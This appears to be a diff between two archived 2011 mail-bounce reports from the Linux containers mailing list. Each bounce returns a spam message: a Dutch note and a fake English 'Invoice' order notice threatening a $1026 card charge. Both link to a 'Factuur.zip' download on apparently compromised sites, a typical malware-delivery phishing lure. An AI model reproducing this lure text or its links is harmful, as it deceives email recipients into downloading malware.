@@ -1,9 +1,9 @@
-From: Mail Delivery Subsystem <MAILER-DAEMON-O5dBjJsMJKfibRoKZwpFrA@public.gmane.org>
-Subject: Returned mail: see transcript for details
-Date: Sat, 3 Dec 2011 09:04:27 +0100
-Message-ID: <201112030804.pB383QSl010220@smtp07.cecot.es>
+From: MAILER-DAEMON-kVLBEChPVFc@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Sat,  3 Dec 2011 09:24:32 +0100 (CET)
+Message-ID: <20111203082432.0A6871877ED@queue.iae.nl>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============8010220683637030596=="
+Content-Type: multipart/mixed; boundary="===============0510208368159149378=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,131 +17,97 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message
+This is a MIME-encapsulated message.
 
---===============8010220683637030596==
+--===============0510208368159149378==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="pB383QSl010220.1322899467/smtp07.cecot.es"
+	boundary="E269F187616.1322900672/queue.iae.nl"
+Content-Transfer-Encoding: 7bit
 
-This is a MIME-encapsulated message
+This is a MIME-encapsulated message.
 
---pB383QSl010220.1322899467/smtp07.cecot.es
+--E269F187616.1322900672/queue.iae.nl
+Content-Description: Notification
+Content-Type: text/plain
 
-The original message was received at Sat, 3 Dec 2011 09:03:16 +0100
-from n4b.isas.sch.ae [213.42.30.102]
+This is the Postfix program at host queue.iae.nl.
 
-   ----- The following addresses had permanent fatal errors -----
-<longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>
-    (reason: 550 5.1.1 <longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota)
-<longino-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>
-    (reason: 550 5.1.1 <longino-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota)
-<longinoqoug-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>
-    (reason: 550 5.1.1 <longinoqoug-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota)
-<longkougasian-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>
-    (reason: 550 5.1.1 <longkougasian-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota)
-<long-luan-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>
-    (reason: 550 5.1.1 <long-luan-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota)
+I'm sorry to have to inform you that your message could not be
+be delivered to one or more recipients. It's attached below.
 
-   ----- Transcript of session follows -----
-... while talking to mxlb01.bedrijvenweb.nl.:
->>> DATA
-<<< 550 5.1.1 <long-luan-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-550 5.1.1 <long-luan-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... User unknown
-<<< 550 5.1.1 <longkougasian-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-550 5.1.1 <longkougasian-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... User unknown
-<<< 550 5.1.1 <longinoqoug-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-550 5.1.1 <longinoqoug-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... User unknown
-<<< 550 5.1.1 <longino-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-550 5.1.1 <longino-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... User unknown
-<<< 550 5.1.1 <longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-550 5.1.1 <longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... User unknown
-<<< 503 5.0.0 Need RCPT (recipient)
-451 4.4.1 reply: read error from mxlb01.bedrijvenweb.nl.
+For further assistance, please send mail to <postmaster>
 
---pB383QSl010220.1322899467/smtp07.cecot.es
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+			The Postfix program
+
+<amjustsendingthisleter-svScA6QWsQBmR6Xm/wNWPw@public.gmane.org>: host
+    mondeef-0.dsl.vianetworks.nl[212.61.119.186] said: 550 5.1.1 User unknown
+    (in reply to RCPT TO command)
+
+--E269F187616.1322900672/queue.iae.nl
+Content-Description: Delivery report
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; smtp07.cecot.es
-Arrival-Date: Sat, 3 Dec 2011 09:03:16 +0100
+Reporting-MTA: dns; queue.iae.nl
+X-Postfix-Queue-ID: E269F187616
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Sat,  3 Dec 2011 09:24:14 +0100 (CET)
 
-Final-Recipient: RFC822; longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org
+Final-Recipient: rfc822; amjustsendingthisleter-svScA6QWsQBmR6Xm/wNWPw@public.gmane.org
 Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mxlb01.bedrijvenweb.nl
-Diagnostic-Code: SMTP; 550 5.1.1 <longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-Last-Attempt-Date: Sat, 3 Dec 2011 09:04:27 +0100
+Status: 5.0.0
+Diagnostic-Code: X-Postfix; host mondeef-0.dsl.vianetworks.nl[212.61.119.186]
+    said: 550 5.1.1 User unknown (in reply to RCPT TO command)
 
-Final-Recipient: RFC822; longino-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mxlb01.bedrijvenweb.nl
-Diagnostic-Code: SMTP; 550 5.1.1 <longino-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-Last-Attempt-Date: Sat, 3 Dec 2011 09:04:27 +0100
-
-Final-Recipient: RFC822; longinoqoug-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mxlb01.bedrijvenweb.nl
-Diagnostic-Code: SMTP; 550 5.1.1 <longinoqoug-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-Last-Attempt-Date: Sat, 3 Dec 2011 09:04:27 +0100
-
-Final-Recipient: RFC822; longkougasian-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mxlb01.bedrijvenweb.nl
-Diagnostic-Code: SMTP; 550 5.1.1 <longkougasian-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-Last-Attempt-Date: Sat, 3 Dec 2011 09:04:27 +0100
-
-Final-Recipient: RFC822; long-luan-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mxlb01.bedrijvenweb.nl
-Diagnostic-Code: SMTP; 550 5.1.1 <long-luan-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>... Sorry, no mailbox here by that name or mailbox is over quota
-Last-Attempt-Date: Sat, 3 Dec 2011 09:04:27 +0100
-
---pB383QSl010220.1322899467/smtp07.cecot.es
+--E269F187616.1322900672/queue.iae.nl
+Content-Description: Undelivered Message
 Content-Type: message/rfc822
+Content-Transfer-Encoding: 7bit
 
-Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from 10.0.1.220 (n4b.isas.sch.ae [213.42.30.102])
-	(authenticated bits=0)
-	by smtp07.cecot.es (8.12.11.20060308/8.12.11) with ESMTP id pB383Del010165;
-	Sat, 3 Dec 2011 09:03:16 +0100
-Received: from [10.0.1.220] by 10.0.1.220 id o9l138fBEXH4R7Ar; Sat, 03 Dec 2011 11:16:20 +0400
-Message-ID: <00b201ccb18b$734e8d00$14000a0a-60x1kTqCWHVgJAXftmDEsQ@public.gmane.org>
-From: "Inform" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org>
-Subject: Order 7183328
-Date: Sat, 03 Dec 2011 11:16:20 +0400
+Received: from radiobytenetwork.it (unknown [95.141.36.83])
+	by queue.iae.nl (Postfix) with ESMTP id E269F187616
+	for <amjustsendingthisleter-svScA6QWsQBmR6Xm/wNWPw@public.gmane.org>; Sat,  3 Dec 2011 09:24:14 +0100 (CET)
+Received: from [95.141.36.83] by radiobytenetwork.it id Dr2Bin6SWBQJ; Sat, 03 Dec 2011 09:24:10 +0100
+Message-ID: <003c01ccb194$ed374400$0500a8c0-2kRSJbaDU6WO2/wZUiRoQzUZDU+1vuVT@public.gmane.org>
+From: "Information" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <amjustsendingthisleter-svScA6QWsQBmR6Xm/wNWPw@public.gmane.org>
+Subject: Invoice 63084512.
+Date: Sat, 03 Dec 2011 09:24:10 +0100
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-X-CECOT-Information: 
-X-CECOT-Scan: Clean
 Content-Transfer-Encoding: quoted-printable
 
 
 
 
-Servus longanicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org
+Dear client,=20
+
+Thank you for the order,
+
+This message is to inform you that your order has been received
+and is currently being processed.
+
+Your order reference is 2276457635.
+
+Your credit card will be charged for 1026 dollars.
+
+Information about the order and delivery located at:
+
+http://agriturismi-bagnisanfilippo.it/docdown/Factuur.zip?id:913Generatio=
+n_user=3Damjustsendingthisleter-svScA6QWsQBmR6Xm/wNWPw@public.gmane.org
+
+____________________________
+Best regards, ticket service.
+Tel. / Fax.: (551) 820 81 417             =20
 
 
-Het antwoord op uw vraag over het profiel op onze website 22.11.2011.
 
-Dagelijks kunt u hier vinden:
-http://hostelinflorence.com/docdown/Factuur.zip?idinvoice=3D515626248879F=
-irma=3Dlonganicpgeg-YLzXzTG/GPVxY8qmFgqGQ/P6llvjuJOh@public.gmane.org
+--E269F187616.1322900672/queue.iae.nl--
 
-
-We zullen blij zijn om samen te werken in de toekomst.
-Tel./Fax.: +31 (0)78 117 34 06
-
-
-
---pB383QSl010220.1322899467/smtp07.cecot.es--
-
-
---===============8010220683637030596==
+--===============0510208368159149378==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -151,4 +117,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============8010220683637030596==--
+--===============0510208368159149378==--
